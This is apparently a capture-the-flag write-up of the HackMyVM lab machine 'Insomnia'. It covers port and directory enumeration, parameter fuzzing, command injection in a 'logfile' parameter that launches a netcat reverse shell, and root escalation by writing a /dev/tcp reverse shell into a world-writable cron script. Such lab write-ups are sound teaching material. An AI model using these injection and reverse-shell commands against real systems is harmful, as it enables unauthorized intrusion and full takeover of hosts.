# Insomnia

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Insomnia | alienum | Beginner | HackMyVM |

**Summary:** Insomnia is a beginner-level machine from HackMyVM created by alienum. The attack chain begins with identifying a web server running on port 8080. Directory enumeration reveals an administration page, and parameter fuzzing uncovers a command injection vulnerability in the `logfile` parameter. This vulnerability is exploited to gain a reverse shell as the `www-data` user. Privilege escalation to `root` is achieved by exploiting a misconfigured cron job running a writable script (`/var/cron/check.sh`) as root.

---

## Reconnaissance

The initial network scan identifies the target IP address as `192.168.100.117`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.117 08:00:27:3C:76:C5 VirtualBox
```

Next, an Nmap scan is performed to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ nmap -sC -sV -p- -T4 192.168.100.117
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 14:32 WIB
Nmap scan report for 192.168.100.117
Host is up (0.0028s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.19-1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Chat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.88 seconds
```

The scan reveals a PHP CLI server running on port 8080. Visiting the page shows a simple chat interface.

![](image.png)

## Vulnerability Discovery

Directory brute-forcing is conducted using `gobuster` to find hidden paths.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ gobuster dir -u http://192.168.100.117:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,txt --exclude-length 2899
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.117:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2899
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administration.php   (Status: 200) [Size: 65]
/chat.txt             (Status: 200) [Size: 263]
/process.php          (Status: 200) [Size: 2]
Progress: 13839 / 13839 (100.00%)
===============================================================
Finished
===============================================================
```

The scan discovers `/administration.php`. Further enumeration is performed on this file to identify valid parameters using `ffuf`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ ffuf -u "http://192.168.100.117:8080/administration.php?FUZZ=chat.txt" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 65

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.117:8080/administration.php?FUZZ=chat.txt
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 65
________________________________________________

logfile                 [Status: 200, Size: 27, Words: 2, Lines: 4, Duration: 321ms]
:: Progress: [6453/6453] :: Job [1/1] :: 53 req/sec :: Duration: [0:01:08] :: Errors: 0 ::
```

The fuzzing identifies a `logfile` parameter. It was observed that the application likely reflects the content of the file specified in this parameter.

## Initial Access

Testing the `logfile` parameter reveals it is vulnerable to command injection using a semicolon separator. A reverse shell payload is crafted and sent using `curl`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ curl "http://192.168.100.117:8080/administration.php?logfile=chat.txt;busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash"
```

A listener on port 4444 catches the reverse shell. The shell is then upgraded to a fully interactive TTY.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 57903
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@insomnia:~/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@insomnia:~/html$ export SHELL=/bin/bash
www-data@insomnia:~/html$ export TERM=xterm
www-data@insomnia:~/html$ stty rows 75 cols 200
www-data@insomnia:~/html$ reset
```

## Internal Enumeration

We inspect the current directory and system files.

```bash
www-data@insomnia:~/html$ ls -la
total 48
drwxr-xr-x 3 www-data www-data  4096 Feb 18 02:40 .
drwxr-xr-x 3 root     root      4096 Dec 17  2020 ..
-rw-r--r-- 1 www-data www-data   426 Dec 21  2020 administration.php
-rw-r--r-- 1 www-data www-data  1610 Dec 20  2020 chat.js
-rw-r--r-- 1 www-data www-data 11151 Feb 18 03:12 chat.txt
drwxr-xr-x 2 www-data www-data  4096 Dec 20  2020 images
-rw-r--r-- 1 www-data www-data  2899 Dec 21  2020 index.php
-rw-r--r-- 1 www-data www-data  1684 Dec 20  2020 process.php
-rwxrwxrwx 1 root     root        20 Dec 21  2020 start.sh
-rw-r--r-- 1 www-data www-data  1363 Dec 20  2020 style.css
www-data@insomnia:~/html$ cat start.sh
php -S 0.0.0.0:8080
www-data@insomnia:~/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
julia:x:1000:1000:julia,,,:/home/julia:/bin/bash
```

We check for sudo privileges but find nothing immediately useful for privilege escalation.

```bash
www-data@insomnia:~/html$ sudo -l
Matching Defaults entries for www-data on insomnia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on insomnia:
    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh
```

However, examining `/etc/crontab` reveals a suspicious entry running as root.

```bash
www-data@insomnia:~/html$ cat /etc/crontab
...
*  *    * * *   root    /bin/bash /var/cron/check.sh
```

## Privilege Escalation

The script `/var/cron/check.sh` is executed by root every minute. We check the permissions of this file.

```bash
www-data@insomnia:~/html$ ls -la /var/cron/check.sh
-rwxrwxrwx 1 root root 54 Feb 18 03:32 /var/cron/check.sh
```

The file is world-writable (`-rwxrwxrwx`). We can modify it to include a reverse shell command.

```bash
www-data@insomnia:~/html$ echo "bash -c 'bash -i >& /dev/tcp/192.168.100.1/8888 0>&1'" > /var/cron/check.sh
```

We set up a listener on port 8888 and wait for the cron job to execute.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

Upon execution, we receive a root shell.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 60289
bash: cannot set terminal process group (8101): Inappropriate ioctl for device
bash: no job control in this shell
root@insomnia:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@insomnia:~# ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/insomnia]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

root@insomnia:~# id
uid=0(root) gid=0(root) groups=0(root)
root@insomnia:~# whoami
root
root@insomnia:~# hostname
insomnia
```

Finally, we retrieve the user and root flags.

```bash
root@insomnia:~# cat /home/julia/user.txt /root/root.txt

~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e[REDACTED]]

~~~~~~~~~~~~~~~\
ROOTED INSOMNIA
~~~~~~~~~~~~~~~
Flag : [c84[REDACTED]]

by Alienum with <3
```

---

## Attack Chain Summary

1.  **Reconnaissance**: Discovered port 8080 open running a PHP CLI server via Nmap.
2.  **Vulnerability Discovery**: Found `/administration.php` via directory bruteforcing and identified a command injection vulnerability in the `logfile` parameter via fuzzing.
3.  **Exploitation**: Exploited the command injection vulnerability using `curl` to execute a reverse shell, gaining initial access as `www-data`.
4.  **Internal Enumeration**: Identified a world-writable script `/var/cron/check.sh` that is executed by a cron job as root.
5.  **Privilege Escalation**: Overwrote `/var/cron/check.sh` with a reverse shell payload, which was executed by the system cron, escalating privileges to `root`.
